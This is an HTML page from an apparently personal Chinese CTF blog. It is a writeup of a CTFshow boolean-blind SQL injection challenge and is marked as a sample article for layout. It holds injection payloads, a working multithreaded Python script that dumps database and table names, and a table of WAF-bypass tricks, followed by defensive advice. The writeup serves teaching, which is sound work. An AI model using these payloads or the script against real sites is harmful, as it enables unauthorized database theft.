@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTFshow Web 入门：布尔盲注从手搓到脚本 · zhshy</title>
+<meta name="description" content="一个没有任何回显的注入点，如何从 length() 试到 substr()，再写成多线程脚本。包含被过滤函数的绕过思路。">
+<meta name="author" content="zhshy">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="zhshy">
+<meta property="og:title" content="CTFshow Web 入门：布尔盲注从手搓到脚本">
+<meta property="og:description" content="页面只有两句话回显时，怎么一步步把库名、表名、字段名、flag 拖出来。">
+<meta property="og:url" content="https://zhshy-chi.github.io/writeups/sqli-blind-ctfshow.html">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>
+(function () {
+  try {
+    var t = localStorage.getItem('theme');
+    if (t === 'light' || t === 'dark') document.documentElement.dataset.theme = t;
+  } catch (e) {}
+})();
+</script>
+</head>
+<body data-page="article" data-slug="sqli-blind-ctfshow">
+<a class="skip-link" href="#main">跳到正文</a>
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html" aria-label="zhshy 首页">
+      <span class="brand-mark">~/</span><span class="brand-text">zhshy</span>
+    </a>
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      <a href="../index.html">首页</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+    </nav>
+    <div class="header-actions">
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换深色/浅色主题">
+        <svg class="i-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg>
+      </button>
+      <a class="icon-btn" href="https://github.com/zhshy-chi" target="_blank" rel="noopener" aria-label="GitHub 主页">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2A10 10 0 0 0 8.8 21.5c.5.1.7-.2.7-.5v-1.9c-2.8.6-3.4-1.3-3.4-1.3-.5-1.2-1.1-1.5-1.1-1.5-.9-.6.1-.6.1-.6 1 .1 1.5 1 1.5 1 .9 1.5 2.3 1.1 2.9.8.1-.7.4-1.1.7-1.4-2.2-.3-4.6-1.1-4.6-5 0-1.1.4-2 1-2.7-.1-.3-.4-1.3.1-2.7 0 0 .8-.3 2.7 1a9.3 9.3 0 0 1 5 0c1.9-1.3 2.7-1 2.7-1 .5 1.4.2 2.4.1 2.7.6.7 1 1.6 1 2.7 0 3.9-2.4 4.7-4.6 5 .4.3.7.9.7 1.9v2.8c0 .3.2.6.7.5A10 10 0 0 0 12 2Z"/></svg>
+      </a>
+      <button class="icon-btn nav-toggle" id="nav-toggle" type="button" aria-label="打开导航菜单" aria-expanded="false" aria-controls="site-nav">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+<article class="wrap article">
+
+  <nav class="breadcrumb" aria-label="面包屑">
+    <a href="../index.html">首页</a><span>/</span>
+    <a href="../writeups.html">Writeups</a><span>/</span>
+    <span class="current">Web</span>
+  </nav>
+
+  <header class="article-head">
+    <div class="article-badges">
+      <span class="badge" data-cat="Web">Web</span>
+      <span class="tag">SQL注入</span>
+      <span class="tag">盲注</span>
+      <span class="tag">Python</span>
+    </div>
+    <h1>CTFshow Web 入门：布尔盲注从手搓到脚本</h1>
+    <p class="article-meta">
+      <time datetime="2026-10-18">2026-10-18</time>
+      <span class="dot-sep">·</span>
+      <span>约 12 分钟</span>
+      <span class="dot-sep">·</span>
+      <span>CTFshow</span>
+    </p>
+    <p class="article-lead">
+      页面不回显数据、不回显报错，只有「登录成功」和「用户名不存在」两句话。
+      这篇记录我怎么从手工测 length()，到写出一把梭的多线程脚本，以及中途被过滤掉的几个函数是怎么绕的。
+    </p>
+  </header>
+
+  <div class="article-layout">
+    <div class="prose" id="prose">
+
+      <div class="note">
+        <p><strong>这是一篇示例文章</strong>，用来演示正文排版（表格、代码块、提示框、目录）。写自己的 writeup 时，把这段提示删掉、内容替换即可。</p>
+      </div>
+
+      <h2>题目信息</h2>
+      <table>
+        <tbody>
+          <tr><th>平台</th><td>CTFshow · Web 入门</td></tr>
+          <tr><th>类型</th><td>SQL 注入 / 布尔盲注</td></tr>
+          <tr><th>入口</th><td><code>?id=1</code> 查询接口</td></tr>
+          <tr><th>目标</th><td>从数据库里取出 flag</td></tr>
+        </tbody>
+      </table>
+
+      <p>
+        盲注是很多人入门 SQL 注入时最烦的一种：明明注进去了，但页面上什么都没变。
+        其实它只是把「读数据」变成了「问是非题」—— 你只能问「第 1 个字符的 ASCII 码是不是大于 100」，
+        然后根据页面的一点点差异判断答案是真是假。
+      </p>
+
+      <h2>第一步：确认页面行为</h2>
+      <p>正常访问 <code>?id=1</code> 返回一篇文章，换成 <code>?id=1'</code> 页面依然是正常的文章，没有报错。</p>
+      <p>这时先做三个试探，判断注入类型：</p>
+      <pre><code class="language-bash"># 1. 逻辑判断：真 / 假 是否回显不同
+?id=1 and 1=1
+?id=1 and 1=2
+
+# 2. 字符串拼接是否生效
+?id=1' and '1'='1
+?id=1' and '1'='2
+
+# 3. 是否有时间盲注（无回显差异时）
+?id=1' and sleep(3)-- -</code></pre>
+      <p>
+        结果是第 1 组的两个请求回显不同：<code>and 1=1</code> 有内容，<code>and 1=2</code> 没内容。
+        说明这是<strong>基于布尔的盲注</strong>，而且参数是数值型（不需要闭合引号就能生效）。
+      </p>
+
+      <h2>第二步：先量一下长度</h2>
+      <p>从库名开始，先确定长度，再逐位猜字符，能把请求数从「256 次」压到「7 × 长度 次」。</p>
+      <pre><code class="language-sql">?id=1 and length(database())=8-- -
+?id=1 and length(database())=9-- -</code></pre>
+      <p>当 <code>=8</code> 时页面正常，<code>=9</code> 时为空，说明库名长度是 8。用同样的方法可以量出表名、字段名和 flag 的长度。</p>
+
+      <h2>第三步：逐位爆破字符</h2>
+      <p>关键是 <code>substr()</code> 配合 <code>ascii()</code>：一次比较一个字符的编码。手搓几条确认能跑通：</p>
+      <pre><code class="language-sql">?id=1 and ascii(substr(database(),1,1))&gt;100-- -
+?id=1 and ascii(substr(database(),1,1))=99-- -</code></pre>
+      <p>
+        第 1 个字符是 <code>99</code>，也就是小写 <code>c</code>。
+        手工这样一位位试肯定不现实，直接写脚本。
+      </p>
+
+      <h2>第四步：多线程盲注脚本</h2>
+      <p>核心思路：先二分法确定每一位的 ASCII，再按位置并发跑，最后拼起来。用 <code>concurrent.futures</code> 就够了，不用装额外的库。</p>
+      <pre><code class="language-python">import requests
+from concurrent.futures import ThreadPoolExecutor
+
+URL = "http://target/index.php"
+TRUE_HINT = "文章"          # 页面为真时的特征字符串
+HEADERS = {"User-Agent": "Mozilla/5.0"}
+
+def cond(payload: str) -&gt; bool:
+    """发出一次请求，判断布尔条件是否为真。"""
+    r = requests.get(URL, params={"id": payload}, headers=HEADERS, timeout=5)
+    return TRUE_HINT in r.text
+
+def bisect_char(expr: str, pos: int, lo: int = 32, hi: int = 128) -&gt; int:
+    """二分法猜出 expr 第 pos 位的字符编码。"""
+    while lo &lt; hi:
+        mid = (lo + hi) // 2
+        if cond(f"1 and ascii(substr(({expr}),{pos},1))&gt;{mid}-- -"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return lo
+
+def dump(expr: str, length: int) -&gt; str:
+    """并发爆破整段字符串。"""
+    with ThreadPoolExecutor(max_workers=8) as pool:
+        codes = list(pool.map(lambda p: bisect_char(expr, p), range(1, length + 1)))
+    return "".join(chr(c) for c in codes)
+
+if __name__ == "__main__":
+    db = dump("database()", 8)
+    print("[+] 库名:", db)
+
+    tables_len = bisect_char(
+        "select group_concat(table_name) from information_schema.tables "
+        f"where table_schema='{db}'", 1
+    )
+    tables = dump(
+        "select group_concat(table_name) from information_schema.tables "
+        f"where table_schema='{db}'", tables_len
+    )
+    print("[+] 表名:", tables)</code></pre>
+      <p>
+        跑一轮大概 20 秒，库名、表名、字段名就都出来了。
+        最后把 <code>expr</code> 换成具体字段，比如 <code>select flag from flag</code>，就能拿到目标。
+      </p>
+
+      <h2>踩坑：那些被过滤掉的写法</h2>
+      <p>这题的 WAF 比我预想的严格，中途换了三次写法才跑通：</p>
+      <table>
+        <thead>
+          <tr><th>被拦的写法</th><th>替换方案</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>substr()</code></td><td>用 <code>mid()</code> 或 <code>substring()</code>，甚至 <code>left(right())</code> 嵌套</td></tr>
+          <tr><td>空格</td><td>用 <code>/**/</code> 或 <code>%09</code>（Tab）、<code>%0a</code>（换行）</td></tr>
+          <tr><td><code>=</code></td><td>用 <code>&lt;</code> / <code>&gt;</code> 二分，反正本来就要二分</td></tr>
+          <tr><td><code>information_schema</code></td><td>5.7+ 用 <code>sys.schema_table_statistics</code>，或直接猜常见表名</td></tr>
+        </tbody>
+      </table>
+      <p>
+        还有一个细节：<code>-- -</code> 后面的空格必须保留，很多 WAF 会拦 <code>--</code> 但放过 <code>-- -</code> 或者 <code>#</code>。
+        我把注释符做成命令行参数，哪种能用就换哪种，省得反复改代码。
+      </p>
+
+      <h2>复盘</h2>
+      <p>这题本身不难，但它把我之前很多「知道概念但没实操」的点串起来了：</p>
+      <ul>
+        <li>布尔盲注的本质是「用响应的差异构造一个 bit 通道」，二分法是最省请求数的问法。</li>
+        <li>先量长度再逐位猜，能少一半以上的无效请求。</li>
+        <li>写脚本时把 payload 生成和请求发送分开，被 WAF 拦了只改生成函数，不用动整体逻辑。</li>
+      </ul>
+
+      <h2>如果我是防守方</h2>
+      <ul>
+        <li>参数化查询（Prepared Statement），从根上断掉拼接。</li>
+        <li>对数据库账号做最小权限，Web 用户不该有 <code>information_schema</code> 之外任何库的读权限。</li>
+        <li>布尔盲注很难靠关键字拦干净，更有效的是限制单 IP 请求频率 + 对异常参数做类型强校验。</li>
+      </ul>
+
+    </div>
+
+    <aside class="toc" id="toc" aria-label="文章目录">
+      <p class="toc-title">目录</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+  </div>
+
+  <nav class="pager" id="pager" aria-label="上一篇与下一篇"></nav>
+  <p class="back-link"><a href="../writeups.html">← 返回全部 Writeups</a></p>
+
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p>© <span id="year">2026</span> zhshy · 本站内容仅供学习交流，请勿用于未授权测试</p>
+    <p class="footer-links">
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+      <a href="https://github.com/zhshy-chi/zhshy-chi.github.io" target="_blank" rel="noopener">源码</a>
+    </p>
+  </div>
+</footer>
+
+<script src="../assets/js/writeups.js"></script>
+<script src="../assets/js/site.js"></script>
+<script src="../assets/js/article.js"></script>
+</body>
+</html>
